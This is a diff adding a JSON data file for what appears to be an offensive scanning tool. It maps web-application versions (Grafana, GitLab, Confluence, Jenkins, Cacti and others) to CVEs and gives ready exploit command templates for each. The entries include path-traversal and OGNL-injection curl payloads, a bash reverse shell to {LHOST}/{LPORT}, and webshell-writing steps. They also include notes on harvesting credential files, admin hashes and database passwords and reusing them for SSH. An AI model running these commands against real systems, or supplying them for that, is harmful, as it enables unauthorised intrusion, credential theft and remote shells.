@@ -1,0 +1,149 @@
+{
+  "_comment": "Web-application version -> CVE knowledge base with guided (confirm-gated) exploitation hints. match: lowercased tokens that must all appear in the fingerprint (product/name/banner/notes). range: optional cve.satisfies() spec; empty means version-agnostic lead (verify the version). exploit: a ready command template with {TARGET}/{PORT} placeholders. note: what it does / what to grab.",
+  "entries": [
+    {
+      "match": ["grafana"],
+      "range": ">=8.0.0,<8.3.1",
+      "cve": "CVE-2021-43798",
+      "severity": "high",
+      "name": "Grafana plugin path traversal (arbitrary file read)",
+      "exploit": "curl --path-as-is 'http://{TARGET}:{PORT}/public/plugins/alertlist/../../../../../../../../etc/passwd'",
+      "note": "Unauthenticated arbitrary file read. Grab /etc/passwd, then /etc/grafana/grafana.ini and /var/lib/grafana/grafana.db for admin hashes/data-source creds."
+    },
+    {
+      "match": ["gitlab"],
+      "range": ">=11.9,<13.10.3",
+      "cve": "CVE-2021-22205",
+      "severity": "critical",
+      "name": "GitLab unauthenticated RCE (ExifTool DjVu)",
+      "exploit": "# clone a public PoC (e.g. gitlab_exif RCE) and point it at the target\n# python3 gitlab_rce.py {TARGET} {PORT} 'bash -c \"bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1\"'",
+      "note": "Pre-auth RCE via image upload -> ExifTool. Use a maintained PoC; register a throwaway account first if uploads need auth."
+    },
+    {
+      "match": ["confluence"],
+      "range": "",
+      "cve": "CVE-2022-26134",
+      "severity": "critical",
+      "name": "Atlassian Confluence OGNL injection RCE",
+      "exploit": "curl -s 'http://{TARGET}:{PORT}/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd%22%2C%23a%29%29%7D/' -D -",
+      "note": "Unauthenticated OGNL injection; command output returns in the X-Cmd response header. Verify the exact version-affected range before relying on it."
+    },
+    {
+      "match": ["jenkins"],
+      "range": ">=2.0,<2.442",
+      "cve": "CVE-2024-23897",
+      "severity": "high",
+      "name": "Jenkins CLI arbitrary file read",
+      "exploit": "java -jar jenkins-cli.jar -s http://{TARGET}:{PORT}/ -http connect-node @/etc/passwd",
+      "note": "Arbitrary file read via the CLI '@' arg expansion. Read /etc/passwd, then Jenkins secrets (secret.key, master.key, credentials.xml) to decrypt stored creds."
+    },
+    {
+      "match": ["joomla"],
+      "range": ">=4.0.0,<4.2.8",
+      "cve": "CVE-2023-23752",
+      "severity": "medium",
+      "name": "Joomla unauthenticated information disclosure",
+      "exploit": "curl -s 'http://{TARGET}:{PORT}/api/index.php/v1/config/application?public=true'",
+      "note": "Leaks the Joomla config including DB user/password over the REST API. Reuse the DB creds for SSH/CMS admin."
+    },
+    {
+      "match": ["drupal"],
+      "range": "",
+      "cve": "CVE-2018-7600",
+      "severity": "critical",
+      "name": "Drupalgeddon2 unauthenticated RCE",
+      "exploit": "# use a maintained drupalgeddon2 PoC against http://{TARGET}:{PORT}/\n# python3 drupalgeddon2.py http://{TARGET}:{PORT}/",
+      "note": "Pre-auth RCE via form-API render array (Drupal 7 <7.58 / 8 <8.5.1). Confirm the Drupal major version first."
+    },
+    {
+      "match": ["tomcat"],
+      "range": ">=9.0.0,<9.0.31",
+      "cve": "CVE-2020-1938",
+      "severity": "high",
+      "name": "Apache Tomcat AJP file read/inclusion (Ghostcat)",
+      "exploit": "# needs the AJP connector (usually 8009) reachable\n# python3 ghostcat.py -p 8009 {TARGET}  # read WEB-INF/web.xml, then chase deployable JSP for RCE",
+      "note": "AJP (8009) file read/inclusion; can become RCE if you can upload a JSP the app then includes."
+    },
+    {
+      "match": ["cacti"],
+      "range": ">=1.0.0,<1.2.23",
+      "cve": "CVE-2022-46169",
+      "severity": "critical",
+      "name": "Cacti unauthenticated command injection",
+      "exploit": "curl -s 'http://{TARGET}:{PORT}/remote_agent.php?action=polldata&local_data_ids[0]=1&host_id=1&poller_id=;id'",
+      "note": "Unauth command injection via remote_agent.php (needs a guessable/allowed host). Swap ';id' for a reverse shell one-liner once confirmed."
+    },
+    {
+      "match": ["webmin"],
+      "range": ">=1.882,<1.930",
+      "cve": "CVE-2019-15107",
+      "severity": "critical",
+      "name": "Webmin password_change RCE",
+      "exploit": "# Metasploit: use exploit/linux/http/webmin_backdoor  (or a curl PoC against /password_change.cgi)\n# RHOSTS {TARGET}; RPORT {PORT}",
+      "note": "Unauthenticated RCE via the password_change.cgi backdoor when password expiry is enabled."
+    },
+    {
+      "match": ["metabase"],
+      "range": ">=0.0.0,<0.46.6.1",
+      "cve": "CVE-2023-38646",
+      "severity": "critical",
+      "name": "Metabase pre-auth RCE (setup-token JDBC)",
+      "exploit": "curl -s 'http://{TARGET}:{PORT}/api/session/properties' | grep -o 'setup-token[^,]*'   # then abuse /api/setup/validate with an H2 JDBC payload",
+      "note": "Leak the setup-token, then RCE via a crafted H2 JDBC connection string in /api/setup/validate."
+    },
+    {
+      "match": ["owncloud"],
+      "range": "",
+      "cve": "CVE-2023-49103",
+      "severity": "critical",
+      "name": "ownCloud graphapi phpinfo secret disclosure",
+      "exploit": "curl -s 'http://{TARGET}:{PORT}/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php'",
+      "note": "Leaks environment (incl. admin credentials / object-store keys) via a bundled phpinfo. Affects owncloud/graphapi 0.2.x-0.3.0."
+    },
+    {
+      "match": ["struts"],
+      "range": "",
+      "cve": "CVE-2017-5638",
+      "severity": "critical",
+      "name": "Apache Struts2 OGNL RCE (Content-Type)",
+      "exploit": "# use a maintained Struts2 (S2-045) PoC against http://{TARGET}:{PORT}/  -- injects OGNL via the Content-Type header",
+      "note": "Classic pre-auth RCE via a malicious Content-Type. Confirm a Struts2 action endpoint (.action/.do) first."
+    },
+    {
+      "match": ["phpmyadmin"],
+      "range": "",
+      "cve": "CVE-2018-12613",
+      "severity": "high",
+      "name": "phpMyAdmin LFI / SQL-shell to RCE",
+      "exploit": "# with valid DB creds, log in then: /index.php?target=db_sql.php%253f/../../../../etc/passwd  (LFI)\n# or write a webshell via SELECT ... INTO OUTFILE if FILE priv is granted",
+      "note": "phpMyAdmin 4.8.x LFI via the target param; combine with SQL SELECT INTO OUTFILE for a webshell once authenticated."
+    },
+    {
+      "match": ["nagios"],
+      "range": "",
+      "cve": "CVE-2019-15949",
+      "severity": "high",
+      "name": "Nagios XI authenticated RCE",
+      "exploit": "# authenticate, then Metasploit: use exploit/linux/http/nagios_xi_authenticated_rce  RHOSTS {TARGET}",
+      "note": "Post-auth RCE (default creds nagiosadmin often work). Enumerate the exact Nagios XI build to pick the right CVE."
+    },
+    {
+      "match": ["nginx ui"],
+      "range": "",
+      "cve": "CVE-2024-49368",
+      "severity": "critical",
+      "name": "Nginx UI (0xJacky) unauthenticated abuse",
+      "exploit": "curl -s 'http://{TARGET}:{PORT}/api/settings'   # probe unauth API; check /api/backup and config test-run RCE paths",
+      "note": "0xJacky/nginx-ui manager exposes powerful config/test/run endpoints. Probe the API unauth (backup disclosure / config-run RCE); a known-vulnerable admin panel is a strong foothold."
+    },
+    {
+      "match": ["spring"],
+      "range": "",
+      "cve": "CVE-2022-22965",
+      "severity": "critical",
+      "name": "Spring4Shell RCE (data binding)",
+      "exploit": "# use a maintained Spring4Shell PoC against http://{TARGET}:{PORT}/  -- writes a JSP webshell via classloader data binding",
+      "note": "RCE on Spring MVC apps running on Tomcat with JDK9+. Confirm a data-binding endpoint; drops a JSP shell under the webroot."
+    }
+  ]
+}
